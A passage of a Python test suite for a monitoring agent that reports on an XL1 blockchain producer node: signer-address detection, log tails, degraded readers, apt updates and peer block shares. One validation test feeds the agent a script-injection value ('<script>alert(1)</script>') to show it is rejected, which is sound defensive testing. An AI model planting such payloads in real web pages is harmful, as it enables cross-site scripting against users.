    """The cache is module state and the file outlives a test."""
    monkeypatch.setattr(agent, "_producer_addr_cache",
                        {"value": None, "looked": False, "at": 0.0})
    monkeypatch.setattr(agent, "PRODUCER_ADDR_FILE",
                        str(tmp_path / "producer-address"))


# The wallet summary the node prints at startup. One phrase, many accounts --
# and on a machine sharing that phrase with another node, the FIRST address
# listed belongs to the other one.

WALLET_SUMMARY = "\n".join([
    "Wallet summary",
    "Shared wallet accounts from m/44'/60'/0'/0:",
    "[0] shared[0]",
    "source: configured root mnemonic",
    "path: m/44'/60'/0'/0/0",
    "address: %s",
    "[1] producer",
    "source: configured root mnemonic",
    "path: m/44'/60'/0'/0/1",
    "address: %s",
    "[2] shared[2]",
    "source: configured root mnemonic",
    "path: m/44'/60'/0'/0/2",
    "address: 2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e",
]) % ("0f1e2d3c4b5a69788796a5b4c3d2e1f009182736", SIGNER)


def test_the_producers_account_is_read_not_the_first_one(monkeypatch, tmp_path):
    """The test this whole mechanism exists for.

    Taking the first address in the summary is the obvious implementation and
    it is wrong in exactly the case that matters: a second node sharing a
    phrase, where account 0 is the OTHER machine's producer. It would report a
    working node's identity for a node that has none, count that node's blocks
    as this one's, and look entirely reasonable doing it.
    """
    _forget_signer(monkeypatch, tmp_path)
    _stub_run(monkeypatch, [("docker logs", WALLET_SUMMARY)])
    assert agent.read_producer_address("xl1-producer") == SIGNER


def test_the_producer_at_account_zero_is_read_too(monkeypatch, tmp_path):
    """The ordinary case, where the producer IS the first account. Keying on
    the label rather than the position has to work here as well, or the fix
    for the rare case breaks the common one."""
    _forget_signer(monkeypatch, tmp_path)
    swapped = (WALLET_SUMMARY.replace("[0] shared[0]", "[0] producer")
                             .replace("[1] producer", "[1] shared[1]"))
    _stub_run(monkeypatch, [("docker logs", swapped)])
    assert agent.read_producer_address("xl1-producer") == "0f1e2d3c4b5a69788796a5b4c3d2e1f009182736"


def test_the_eligibility_line_still_works_without_a_summary(monkeypatch, tmp_path):
    """The summary is printed once at startup; the complaint repeats. A
    long-running container whose startup has scrolled out of the window this
    reads still has to be identifiable."""
    _forget_signer(monkeypatch, tmp_path)
    _stub_run(monkeypatch, [("docker logs", STAKE_LOG)])
    assert agent.read_producer_address("xl1-producer") == SIGNER


def test_the_signing_address_is_read_from_the_nodes_own_log(monkeypatch, tmp_path):
    _forget_signer(monkeypatch, tmp_path)
    _stub_run(monkeypatch, [("docker logs", STAKE_LOG)])
    assert agent.read_producer_address("xl1-producer") == SIGNER


def test_a_prefixed_address_is_normalised(monkeypatch, tmp_path):
    """Some builds print it with 0x. The scan matches bare addresses, so one
    stored with the prefix would never match a block and would look exactly
    like a node that has produced nothing."""
    _forget_signer(monkeypatch, tmp_path)
    _stub_run(monkeypatch, [
        ("docker logs", "Producer 0x%s has insufficient stake." % SIGNER.upper()),
    ])
    assert agent.read_producer_address("xl1-producer") == SIGNER


def test_a_duration_is_not_an_address(monkeypatch, tmp_path):
    """"producer in 967ms" is on every start line. A looser match would store
    nonsense as the address and count against it."""
    _forget_signer(monkeypatch, tmp_path)
    _stub_run(monkeypatch, [("docker logs", "[xl1] system ready (producer in 967ms)")])
    assert agent.read_producer_address("xl1-producer") is None


def test_the_address_survives_a_restart(monkeypatch, tmp_path):
    """A staked node stops printing the eligibility line. Holding this only in
    memory would revert counting to the reward address at the next restart --
    months later, silently, on a node that had been counting correctly."""
    _forget_signer(monkeypatch, tmp_path)
    _stub_run(monkeypatch, [("docker logs", STAKE_LOG)])
    assert agent.read_producer_address("xl1-producer") == SIGNER

    # Restart: cache cleared, and the log no longer carries the line.
    monkeypatch.setattr(agent, "_producer_addr_cache",
                        {"value": None, "looked": False, "at": 0.0})
    _stub_run(monkeypatch, [("docker logs", "[BlockRunner] Building block 1")])
    assert agent.read_producer_address("xl1-producer") == SIGNER


NEW_SIGNER = "0f1e2d3c4b5a69788796a5b4c3d2e1f009182736"


def test_a_new_wallet_phrase_replaces_the_remembered_address(monkeypatch, tmp_path):
    """The bug this closes, found on real hardware.

    The address was remembered so it would survive a restart -- correct -- and
    then never questioned again, which is not. A node handed a new wallet
    phrase becomes a different producer, and the file written before that went
    on being believed, counting blocks for an identity the machine no longer
    had. It took deleting the file by hand to recover.
    """
    _forget_signer(monkeypatch, tmp_path)
    _stub_run(monkeypatch, [("docker logs", STAKE_LOG)])
    assert agent.read_producer_address("xl1-producer") == SIGNER

    # The phrase is replaced. The node now announces a different identity, and
    # enough time has passed for the agent to ask again.
    # Far enough back to be due, measured against the same clock the code
    # uses. Zero is not "long ago": time.monotonic() is uptime, so on a
    # freshly booted machine -- a CI container, say -- zero is minutes ago
    # and the value still counts as fresh. That passed here and failed there.
    agent._producer_addr_cache["at"] = (
        time.monotonic() - agent.PRODUCER_ADDR_RECHECK - 1)
    _stub_run(monkeypatch, [
        ("docker logs", "Producer %s has insufficient stake." % NEW_SIGNER),
    ])
    assert agent.read_producer_address("xl1-producer") == NEW_SIGNER
    # And the file is corrected, or the next restart resurrects the old one.
    with open(str(tmp_path / "producer-address")) as fh:
        assert fh.read().strip() == NEW_SIGNER


def test_the_node_is_not_re_asked_on_every_call(monkeypatch, tmp_path):
    """Re-reading a container log is not free, and this is called on the
    heartbeat path. The point is to notice a change eventually, not instantly."""
    _forget_signer(monkeypatch, tmp_path)
    calls = []

    def counting_run(args, timeout=10, **_kw):
        calls.append(args)
        return STAKE_LOG

    monkeypatch.setattr(agent, "run", counting_run)
    for _ in range(5):
        assert agent.read_producer_address("xl1-producer") == SIGNER
    assert len(calls) == 1, "asked the node %d times for one answer" % len(calls)


def test_silence_does_not_erase_what_is_known(monkeypatch, tmp_path):
    """A staked node stops printing the eligibility line. Forgetting on that
    basis would be worse than a stale answer: the count would fall back to the
    reward address, which is the failure the whole thing exists to remove."""
    _forget_signer(monkeypatch, tmp_path)
    _stub_run(monkeypatch, [("docker logs", STAKE_LOG)])
    assert agent.read_producer_address("xl1-producer") == SIGNER

    # Far enough back to be due, measured against the same clock the code
    # uses. Zero is not "long ago": time.monotonic() is uptime, so on a
    # freshly booted machine -- a CI container, say -- zero is minutes ago
    # and the value still counts as fresh. That passed here and failed there.
    agent._producer_addr_cache["at"] = (
        time.monotonic() - agent.PRODUCER_ADDR_RECHECK - 1)
    _stub_run(monkeypatch, [("docker logs", "[BlockRunner] Building block 1")])
    assert agent.read_producer_address("xl1-producer") == SIGNER


def test_counting_prefers_the_signer_over_the_reward_address(monkeypatch, tmp_path):
    _forget_signer(monkeypatch, tmp_path)
    monkeypatch.setattr(agent, "REWARD_ADDRESS", REWARD)
    _stub_run(monkeypatch, [("docker logs", STAKE_LOG)])
    address, fallback = agent.counting_address("xl1-producer")
    assert address == SIGNER
    assert fallback is False


def test_counting_falls_back_and_says_so(monkeypatch, tmp_path):
    """Without the signer the reward address is the best guess available -- and
    right on the common setup where they are the same wallet. What must not
    happen is reporting that count as though it were certain."""
    _forget_signer(monkeypatch, tmp_path)
    monkeypatch.setattr(agent, "REWARD_ADDRESS", REWARD)
    _stub_run(monkeypatch, [("docker logs", "[BlockRunner] Building block 1")])
    address, fallback = agent.counting_address("xl1-producer")
    assert address == REWARD
    assert fallback is True


def test_the_scan_is_sent_the_signing_address(monkeypatch, tmp_path):
    """The one that matters.

    Asserting counting_address alone would pass with fetch_producer_stats
    still calling read_reward_address -- which is the bug being fixed. This
    watches what the scan is actually asked for.
    """
    _forget_signer(monkeypatch, tmp_path)
    monkeypatch.setattr(agent, "REWARD_ADDRESS", REWARD)
    monkeypatch.setattr(agent, "PRODUCER_URL", "http://127.0.0.1:8090/producer")
    monkeypatch.setattr(agent, "_producer_cursor",
                        {"known": True, "block": None, "backfill": None,
                         "backfill_done": True})
    monkeypatch.setattr(agent, "_producer_cache", {"at": 0, "value": None})
    _stub_run(monkeypatch, [("docker logs", STAKE_LOG)])

    asked = {}

    def fake_request(address, params):
        asked["address"] = address
        asked["params"] = params
        return {"produced": 3, "window": 200}

    monkeypatch.setattr(agent, "_producer_request", fake_request)
    agent.fetch_producer_stats("xl1-producer")

    assert asked["address"] == SIGNER, "the scan was sent the reward address"
    assert asked["params"]["address"] == SIGNER


# --- the node's own eligibility verdict ---------------------------------------

def test_insufficient_stake_is_surfaced(monkeypatch):
    """The stake figure is not readable from the public gateway, but the node
    states its own conclusion on the code path that decides whether it can
    produce. That verdict is what gets reported."""
    log = "\n".join([
        "[xl1] system ready (producer in 7982ms)",
        "Producer d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0 has insufficient stake.",
    ])
    _stub_run(monkeypatch, [("docker logs", log)])
    assert agent.read_blocked_reason("xl1-producer") == "insufficient stake"


def test_no_balance_is_surfaced(monkeypatch):
    _stub_run(monkeypatch, [
        ("docker logs", "Producer d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0 has no balance."),
    ])
    assert agent.read_blocked_reason("xl1-producer") == "no balance"


def test_a_healthy_log_reports_nothing(monkeypatch):
    """The absence of a complaint is the normal case and must not be dressed
    up as a finding."""
    _stub_run(monkeypatch, [
        ("docker logs", "\n".join([
            "[BlockRunner] Building block 569649",
            "[BlockRunner] Building block 569650",
        ])),
    ])
    assert agent.read_blocked_reason("xl1-producer") is None


def test_no_container_means_no_verdict(monkeypatch):
    _stub_run(monkeypatch, [])
    assert agent.read_blocked_reason(None) is None


def test_the_search_is_windowed(monkeypatch):
    """A complaint from days ago that has since been resolved is not a current
    fault. Reporting it as one would be worse than reporting nothing."""
    seen = []

    def fake_run(args, timeout=10, **_kw):
        seen.append(args)
        return ""

    monkeypatch.setattr(agent, "run", fake_run)
    agent.read_blocked_reason("xl1-producer")
    assert "--since" in seen[0], seen[0]
    assert agent.ELIGIBILITY_WINDOW in seen[0]


# --- how many node images are on disk -----------------------------------------

def test_counts_only_versioned_images(monkeypatch):
    """One image accumulates per CLI release at roughly half a gigabyte. The
    promotion tag points at one of them and must not be counted twice."""
    listing = chr(10).join(["local", "5.3.0", "5.2.4", "5.2.3", "<none>"])
    _stub_run(monkeypatch, [("docker images", listing)])
    assert agent.read_image_inventory() == 3


def test_no_images_is_zero_not_unknown(monkeypatch):
    _stub_run(monkeypatch, [("docker images", "")])
    assert agent.read_image_inventory() == 0


def test_a_docker_failure_reports_nothing_rather_than_zero(monkeypatch):
    """Zero images and "docker did not answer" are different facts, and
    reporting the second as the first would look like the prune worked."""
    monkeypatch.setattr(agent, "run", lambda *a, **k: None)
    assert agent.read_image_inventory() is None


# --- the node log tail --------------------------------------------------------

def test_the_tail_is_capped_by_line_count(monkeypatch):
    """A heartbeat is not a log shipper. Whatever docker returns, only the
    configured number of lines leaves the Pi."""
    monkeypatch.setattr(agent, "LOG_TAIL_LINES", 3)
    _stub_run(monkeypatch, [("docker logs", chr(10).join("line%d" % i for i in range(20)))])
    tail = agent.read_log_tail("xl1-producer")
    assert tail == ["line17", "line18", "line19"]


def _stub_docker_logs(monkeypatch, all_lines):
    """A `docker logs` stub that honours --tail, as the real one does.

    The general-purpose stub returns its canned string whatever arguments it
    is handed. That is fine for most of these tests and useless for this one:
    a tail test whose stub ignores --tail passes with the bug present, which is
    exactly what the first version of it did.
    """
    def fake_run(args, timeout=10, **_kw):
        if "logs" not in args:
            return None
        n = int(args[args.index("--tail") + 1])
        return chr(10).join(all_lines[-n:])
    monkeypatch.setattr(agent, "run", fake_run)


def test_blank_lines_do_not_shrink_the_tail(monkeypatch):
    """The count must not wobble. Blanks are dropped after the tail is taken,
    so asking docker for exactly N returns fewer than N and the panel reads
    "last 20 lines" one minute and "last 16" the next, for no reason a reader
    can see."""
    monkeypatch.setattr(agent, "LOG_TAIL_LINES", 20)
    # Every third line blank: 90 lines available, 60 of them real.
    noisy = ["" if i % 3 else "line%d" % i for i in range(90)]
    _stub_docker_logs(monkeypatch, noisy)
    tail = agent.read_log_tail("xl1-producer")
    assert len(tail) == 20, f"should be a full 20 despite the blanks, got {len(tail)}"
    assert all(line.strip() for line in tail)


def test_the_tail_is_the_most_recent_lines(monkeypatch):
    """Filling the count must not mean reaching further back than asked --
    what you want is the newest 20, not the oldest 20 of a wider window."""
    monkeypatch.setattr(agent, "LOG_TAIL_LINES", 5)
    _stub_docker_logs(monkeypatch, ["line%d" % i for i in range(50)])
    assert agent.read_log_tail("xl1-producer") == [
        "line45", "line46", "line47", "line48", "line49"]


def test_it_asks_for_more_lines_than_it_keeps(monkeypatch):
    """The over-fetch is what makes the count stable, so it is worth pinning
    rather than leaving to be quietly optimised away."""
    seen = []

    def fake_run(args, timeout=10, **_kw):
        seen.append(args)
        return "a"

    monkeypatch.setattr(agent, "LOG_TAIL_LINES", 20)
    monkeypatch.setattr(agent, "run", fake_run)
    agent.read_log_tail("xl1-producer")
    requested = int(seen[0][seen[0].index("--tail") + 1])
    assert requested > 20, f"asked for only {requested}"


def test_a_short_log_returns_what_there_is(monkeypatch):
    """A freshly started container has not printed 20 lines yet, and saying so
    is better than padding."""
    monkeypatch.setattr(agent, "LOG_TAIL_LINES", 20)
    _stub_run(monkeypatch, [("docker logs", chr(10).join(["one", "two", "three"]))])
    assert agent.read_log_tail("xl1-producer") == ["one", "two", "three"]


def test_long_lines_are_truncated(monkeypatch):
    """One enormous stack trace should not turn a heartbeat into a megabyte."""
    monkeypatch.setattr(agent, "LOG_TAIL_LINES", 5)
    _stub_run(monkeypatch, [("docker logs", "x" * 5000)])
    tail = agent.read_log_tail("xl1-producer")
    assert len(tail) == 1
    assert len(tail[0]) == agent.LOG_TAIL_MAX_CHARS


def test_blank_lines_are_dropped(monkeypatch):
    monkeypatch.setattr(agent, "LOG_TAIL_LINES", 10)
    _stub_run(monkeypatch, [("docker logs", chr(10).join(["real", "", "   ", "also real"]))])
    assert agent.read_log_tail("xl1-producer") == ["real", "also real"]


def test_zero_lines_disables_it(monkeypatch):
    monkeypatch.setattr(agent, "LOG_TAIL_LINES", 0)
    _stub_run(monkeypatch, [("docker logs", "something")])
    assert agent.read_log_tail("xl1-producer") is None


def test_no_container_means_no_tail(monkeypatch):
    _stub_run(monkeypatch, [])
    assert agent.read_log_tail(None) is None


# --- is the agent working, or merely running? --------------------------------
#
# Every collector returns None on failure so that a failure can never break a
# heartbeat. The cost is that a blank field could mean "not collected yet" or
# "collection is failing", and a half-blind agent looked exactly like a
# healthy one. collect() now says which readers came back empty.


def _blind_agent(monkeypatch, tmp_path):
    """An ESTABLISHED agent where a container exists and every reader fails.

    Pins the host filesystem too. The apt reader is only reported as failing on
    a machine that HAS apt, so leaving os.path.exists alone made these tests
    agree with whatever the runner happened to be: they passed on Windows,
    where /usr/bin/apt is absent, and failed on Ubuntu, where it is not. A test
    whose result depends on the operating system is testing the operating
    system.

    Established matters. A freshly started agent has not been told its cursor
    yet and deliberately does not scan -- scanning blind would re-count a range
    the backend already has -- so producer_stats returning nothing is correct
    there, and must not read as a fault.
    """
    monkeypatch.setitem(agent._producer_cursor, "known", True)
    monkeypatch.setitem(agent._producer_cache, "at", agent.time.monotonic() - 4000)
    monkeypatch.setattr(agent, "PRODUCER_INTERVAL", 900)
    monkeypatch.setattr(agent.os.path, "exists", lambda p: "apt" in str(p))
    monkeypatch.setattr(agent, "CONTAINER", "xl1-producer")
    monkeypatch.setattr(agent, "IMAGES_REPO", str(tmp_path / "no-such-repo"))
    monkeypatch.setattr(agent, "STANDING_URL", "http://localhost:9/standing")
    monkeypatch.setattr(agent, "CLI_REGISTRY", "http://localhost:9/latest")
    monkeypatch.setattr(agent, "REBUILD_TIMER", "")
    monkeypatch.setattr(agent, "PRODUCER_UNIT", "")
    monkeypatch.setattr(agent, "run", lambda *a, **k: None)
    monkeypatch.setattr(agent, "fetch_block_heights", lambda: None)
    monkeypatch.setattr(agent, "fetch_producer_stats", lambda name: None)
    monkeypatch.setattr(agent, "fetch_cli_latest", lambda: None)
    monkeypatch.setattr(agent, "fetch_standing", lambda name: agent.NO_STANDING)
    monkeypatch.setattr(agent, "fetch_peers", lambda name: (None, None, None))
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")


def test_a_blind_agent_says_so(monkeypatch, tmp_path):
    """The failure this exists to catch: heartbeats still arriving, panel
    still ONLINE, and nothing behind it actually working."""
    _blind_agent(monkeypatch, tmp_path)
    failing = agent.collect()["agent_degraded"]
    for expected in ("cli_version", "cli_latest", "log_tail",
                     "producer_stats", "chain_heights", "node_image_count"):
        assert expected in failing, f"{expected} failed silently: {failing}"


def test_silence_that_is_an_answer_is_not_a_failure(monkeypatch, tmp_path):
    """The guard that decides whether this feature is worth having.

    Most collectors are legitimately quiet: no rebuild timer installed, no
    systemd unit managing the container, no reason the node is blocked. Those
    are answers. Listing them would swap a missing signal for a false one, and
    an operator who learns the amber line cries wolf stops reading it.
    """
    _blind_agent(monkeypatch, tmp_path)
    failing = agent.collect()["agent_degraded"]
    for never in ("rebuild_timer_active", "rebuild_timer_next", "producer_unit",
                  "producer_blocked", "backfill_chunk", "node_containers"):
        assert never not in failing, f"{never} is normally absent, not broken"


def test_a_disabled_lookup_is_not_a_failure(monkeypatch, tmp_path):
    """Switching the registry check off is a choice, not a fault."""
    _blind_agent(monkeypatch, tmp_path)
    monkeypatch.setattr(agent, "CLI_REGISTRY", "")
    monkeypatch.setattr(agent, "VERSIONS_URL", "")
    monkeypatch.setattr(agent, "SDK_REGISTRY", "")
    assert "cli_latest" not in agent.collect()["agent_degraded"]


def test_no_container_means_no_container_readers_are_blamed(monkeypatch, tmp_path):
    """With the container gone the panel already says so loudly. Reporting
    six more failures underneath it is noise about a cause already known."""
    _blind_agent(monkeypatch, tmp_path)
    monkeypatch.setattr(agent, "find_container", lambda: None)
    failing = agent.collect()["agent_degraded"]
    for needs_container in ("cli_version", "log_tail", "producer_stats",
                            "producer_balance"):
        assert needs_container not in failing, failing


def test_a_healthy_agent_reports_an_empty_list(monkeypatch, tmp_path):
    """Sent even when empty: absent would be indistinguishable from an older
    agent that does not report this at all."""
    _blind_agent(monkeypatch, tmp_path)
    monkeypatch.setattr(agent, "find_container", lambda: None)
    monkeypatch.setattr(agent, "CLI_REGISTRY", "")
    monkeypatch.setattr(agent, "VERSIONS_URL", "")
    monkeypatch.setattr(agent, "SDK_REGISTRY", "")
    monkeypatch.setattr(agent, "fetch_block_heights", lambda: {"sequence": 570000})
    monkeypatch.setattr(agent, "read_image_inventory", lambda: 3)
    # A blind agent is not a healthy one until every reader is working, and apt
    # was the reader still left blind here.
    monkeypatch.setattr(agent, "read_os_updates", lambda: (0, 0, 1.0, False))
    payload = agent.collect()
    assert payload["agent_degraded"] == [], payload["agent_degraded"]


def test_every_setting_is_documented():
    """The example env file claims to be the complete list, and drifted anyway:
    four variables were added over time and none reached it. A reader
    configuring this agent has no way to discover a setting that exists only in
    the source, so an undocumented one is effectively not a setting at all.

    If this fails, add the variable to xl1-heartbeat.env.example with a comment
    saying what it is for -- not just the name.
    """
    src = (Path(__file__).parent / "xl1_heartbeat.py").read_text(encoding="utf-8")
    example = (Path(__file__).parent / "xl1-heartbeat.env.example").read_text(encoding="utf-8")
    read = set(re.findall(r'os\.environ\.get\(\s*"([A-Z0-9_]+)"', src))
    documented = set(re.findall(r'^#?\s*([A-Z0-9_]+)=', example, re.M))
    missing = read - documented
    assert not missing, (
        f"read by the agent but absent from the example file: {sorted(missing)}")


# --- host packages -----------------------------------------------------------
#
# The layer under everything else. A block producer holding keys can sit on a
# months-old OpenSSL while every node signal on the dashboard reads perfectly
# normal, because nothing here was looking at the machine itself.

UPGRADABLE = """Listing...
libssl3/bookworm-security 3.0.14-1~deb12u2 arm64 [upgradable from: 3.0.11-1~deb12u2]
curl/bookworm-security 7.88.1-10+deb12u7 arm64 [upgradable from: 7.88.1-10+deb12u5]
vim/bookworm 2:9.0.1378-2 arm64 [upgradable from: 2:9.0.1000-4]
"""


def _stub_apt(monkeypatch, out, exists=True):
    monkeypatch.setitem(agent._os_cache, "value", None)
    monkeypatch.setattr(agent, "run", lambda a, timeout=10: out if "apt" in a else None)
    monkeypatch.setattr(agent.os.path, "exists", lambda p: exists)
    monkeypatch.setattr(agent.os.path, "getmtime", lambda p: agent.time.time() - 3600)


def test_security_updates_are_counted_apart_from_the_rest(monkeypatch):
    """A Pi always has some routine package a version behind. Mailing about
    that would train the reader to ignore the alert within a month, taking the
    security mail with it -- so the two are counted separately."""
    _stub_apt(monkeypatch, UPGRADABLE)
    total, security, age, reboot = agent.read_os_updates()
    assert total == 3, "three upgradable packages"
    assert security == 2, "two of them from a -security suite"


def test_a_quiet_host_reports_zero_not_nothing(monkeypatch):
    _stub_apt(monkeypatch, "Listing...\n")
    total, security, age, reboot = agent.read_os_updates()
    assert (total, security) == (0, 0)


def test_stale_package_lists_are_reported(monkeypatch):
    """The whole reason this field exists. apt answers against its last
    refresh, so a host whose lists have not been updated in months says
    "0 updates" -- confidently, and wrongly. That is worse than not checking,
    because it reads as good news."""
    _stub_apt(monkeypatch, "Listing...\n")
    monkeypatch.setattr(agent.os.path, "getmtime",
                        lambda p: agent.time.time() - 90 * 24 * 3600)
    _, _, age_hours, _ = agent.read_os_updates()
    assert age_hours > 24 * 30, f"should show the lists are ancient, got {age_hours}"


def test_apt_failing_is_not_reported_as_no_updates(monkeypatch):
    """Same trap from the other direction: a failed read must never look like
    a clean bill of health."""
    _stub_apt(monkeypatch, None)
    assert agent.read_os_updates() is None


def test_the_check_can_be_switched_off(monkeypatch):
    _stub_apt(monkeypatch, UPGRADABLE)
    monkeypatch.setattr(agent, "OS_UPDATE_INTERVAL", 0)
    assert agent.read_os_updates() is None


def test_a_host_without_apt_is_not_a_broken_reader(monkeypatch):
    """Not every machine is Debian. Reporting a missing apt as a failing
    reader would be a permanent false alarm on such a host."""
    _stub_apt(monkeypatch, None, exists=False)
    monkeypatch.setattr(agent, "find_container", lambda: None)
    monkeypatch.setattr(agent, "fetch_block_heights", lambda: {"sequence": 1})
    monkeypatch.setattr(agent, "read_image_inventory", lambda: 1)
    monkeypatch.setattr(agent, "CLI_REGISTRY", "")
    monkeypatch.setattr(agent, "VERSIONS_URL", "")
    monkeypatch.setattr(agent, "SDK_REGISTRY", "")
    assert "os_updates" not in agent.collect()["agent_degraded"]


def test_a_healthy_steady_state_agent_reports_nothing_failing(monkeypatch):
    """The test the earlier ones should have been.

    `test_silence_that_is_an_answer_is_not_a_failure` checks a list of
    collectors I hand-picked as normally-quiet, which only ever covers cases
    already thought of. It passed while the panel showed two false alarms on a
    perfectly healthy node.

    This instead builds an agent where everything genuinely works and asserts
    that NOTHING is reported -- so any collector whose quiet path is normal
    fails here without anyone having to have anticipated it.

    Both bugs it would have caught:

      producer_stats returns None on ~29 beats in 30 by design. It is a rate
      limiter, not a cache: serving the previous scan would re-send an
      already-counted range every heartbeat. Not-due is not failure.

      repo_upstream leaves `behind` as None whenever local and upstream match,
      because there is nothing to compare. Keying on it meant every up-to-date
      checkout read as a broken reader, on the same screen as a tile saying
      "up to date".
    """
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    monkeypatch.setattr(agent, "read_cli_version", lambda name: "5.2.4")
    monkeypatch.setattr(agent, "fetch_cli_latest", lambda: "5.2.4")
    # A version behind is a mismatch for the panel to flag, not a failure to
    # collect -- so a healthy agent still reports nothing degraded here.
    monkeypatch.setattr(agent, "read_sdk_version", lambda: "5.3.3")
    monkeypatch.setattr(agent, "fetch_sdk_latest", lambda: "5.4.1")
    monkeypatch.setattr(agent, "read_log_tail", lambda name: ["a block", "another"])
    monkeypatch.setattr(agent, "read_image_inventory", lambda: 3)
    monkeypatch.setattr(agent, "read_os_updates", lambda: (8, 3, 4.0, False))
    monkeypatch.setattr(agent, "fetch_block_heights", lambda: {"sequence": 570990})
    monkeypatch.setattr(agent, "fetch_standing",
                        lambda name: (12.5, True, "XL1", "12500000000000000000", "0", "1"))
    monkeypatch.setattr(agent, "fetch_earnings", lambda name: (37950.0, 759, 50.0, 3.055, True))
    monkeypatch.setattr(agent, "fetch_peers", lambda name: (4, 14.7, 1000))
    monkeypatch.setattr(agent, "read_blocked_reason", lambda name: None)
    monkeypatch.setattr(agent, "read_producer_unit", lambda: None)
    monkeypatch.setattr(agent, "read_rebuild_timer", lambda: (None, None))
    monkeypatch.setattr(agent, "list_node_containers", lambda: ["xl1-producer"])
    monkeypatch.setattr(agent, "read_repo_head", lambda: "a" * 40)

    # The repo is up to date, so there is nothing to compare and `behind`
    # is legitimately None. This is the normal state, not a fault.
    monkeypatch.setattr(agent, "fetch_repo_upstream",
                        lambda local: ("a" * 40, None, "v5.2.4", "v5.2.4"))

    # A scan ran nine minutes ago and is not due again for fifteen. The
    # overwhelmingly common case on any given heartbeat.
    monkeypatch.setattr(agent, "fetch_producer_stats", lambda name: None)
    monkeypatch.setitem(agent._producer_cursor, "known", True)
    monkeypatch.setitem(agent._producer_cache, "at", agent.time.monotonic() - 540)
    monkeypatch.setattr(agent, "PRODUCER_INTERVAL", 900)

    failing = agent.collect()["agent_degraded"]
    assert failing == [], f"a healthy node must report nothing failing, got {failing}"


def test_a_scan_that_was_due_and_failed_is_still_reported(monkeypatch):
    """The other half. Suppressing the not-due case must not suppress the
    real one -- production counting stopping is the most consequential thing
    this agent can fail to notice."""
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    monkeypatch.setattr(agent, "fetch_producer_stats", lambda name: None)
    monkeypatch.setitem(agent._producer_cursor, "known", True)
    monkeypatch.setitem(agent._producer_cache, "at", agent.time.monotonic() - 4000)
    monkeypatch.setattr(agent, "PRODUCER_INTERVAL", 900)
    assert "producer_stats" in agent.collect()["agent_degraded"]


def test_the_ticker_comes_from_the_service_not_from_here(monkeypatch):
    """A number on an operator panel with no unit beside it is not a balance.
    The symbol is read from whatever actually queried the chain, so the panel
    cannot label a figure with a ticker nothing verified."""
    class _Resp:
        status = 200
        def read(self):
            return (b'{"balance": 1.5, "fundedForProduction": true, '
                    b'"symbol": "XL1", "balanceRaw": "1500000000000000000"}')
        def __enter__(self): return self
        def __exit__(self, *a): return False

    monkeypatch.setattr(agent.urllib.request, "urlopen", lambda url, timeout=0: _Resp())
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "0x" + "c" * 40)
    agent._standing_cache["value"] = None
    agent._standing_cache["at"] = 0.0
    assert agent.fetch_standing("xl1-producer") == (1.5, True, "XL1", "1500000000000000000", None, None)


def test_an_older_service_sends_no_ticker_and_that_is_fine(monkeypatch):
    """The panel falls back to an unlabelled number rather than inventing one."""
    class _Resp:
        status = 200
        def read(self): return b'{"balance": 1.5, "fundedForProduction": true}'
        def __enter__(self): return self
        def __exit__(self, *a): return False

    monkeypatch.setattr(agent.urllib.request, "urlopen", lambda url, timeout=0: _Resp())
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "0x" + "d" * 40)
    agent._standing_cache["value"] = None
    agent._standing_cache["at"] = 0.0
    balance, funded, symbol, raw, _stake, _min = agent.fetch_standing("xl1-producer")
    assert (balance, funded) == (1.5, True)
    assert symbol is None and raw is None


def test_a_junk_ticker_is_refused(monkeypatch):
    """The service is on this host's loopback, but the value is rendered and
    the shape is cheap to pin."""
    class _Resp:
        status = 200
        def read(self):
            return (b'{"balance": 1.5, "fundedForProduction": true, '
                    b'"symbol": "<script>alert(1)</script>", "balanceRaw": "not a number"}')
        def __enter__(self): return self
        def __exit__(self, *a): return False

    monkeypatch.setattr(agent.urllib.request, "urlopen", lambda url, timeout=0: _Resp())
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "0x" + "e" * 40)
    agent._standing_cache["value"] = None
    agent._standing_cache["at"] = 0.0
    _, _, symbol, raw, _stake, _min = agent.fetch_standing("xl1-producer")
    assert symbol is None and raw is None


# --- peer context ------------------------------------------------------------
#
# A block count says nothing on its own. The same number is healthy against
# three other producers and alarming against ten.

PEERS_BODY = {
    "window": 1000, "totalBlocks": 1000,
    "producers": [
        {"address": "7ac8355c0ed1b6aaaaaaaaaaaaaaaaaaaaaaaaaa", "blocks": 316, "balance": 280419.0},
        {"address": "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0", "blocks": 147, "balance": 27053.0},
    ],
}


def _stub_peers(monkeypatch, body, status=200, reward="0xd1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0"):
    class _Resp:
        def __init__(self): self.status = status
        def read(self): return json.dumps(body).encode() if body is not None else b"{}"
        def __enter__(self): return self
        def __exit__(self, *a): return False
    monkeypatch.setattr(agent.urllib.request, "urlopen", lambda url, timeout=0: _Resp())
    monkeypatch.setattr(agent, "REWARD_ADDRESS", reward)
    monkeypatch.setitem(agent._peers_cache, "value", None)
    monkeypatch.setitem(agent._peers_cache, "at", 0.0)


def test_our_share_is_found_among_the_peers(monkeypatch):
    _stub_peers(monkeypatch, PEERS_BODY)
    count, share, window = agent.fetch_peers("xl1-producer")
    assert count == 2
    assert share == 14.7, f"147 of 1000 blocks is 14.7%, got {share}"
    assert window == 1000


def test_a_leading_zero_in_the_address_still_matches(monkeypatch):
    """The reward address arrives 0x-prefixed. Stripping it with lstrip("0x")
    also eats a leading zero of the address itself, so 0x0a65... would never
    match its own row and the node would report a 0% share of its own blocks --
    quietly, and looking exactly like a node that had stopped producing."""
    addr = "0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9"
    body = {"window": 100, "totalBlocks": 100,
            "producers": [{"address": addr, "blocks": 40, "balance": 1.0}]}
    _stub_peers(monkeypatch, body, reward="0x" + addr)
    count, share, _ = agent.fetch_peers("xl1-producer")
    assert share == 40.0, f"leading zero lost: got {share}"


def test_a_node_absent_from_the_window_reports_zero_not_nothing(monkeypatch):
    """Producing nothing in the window is a real answer and the one worth
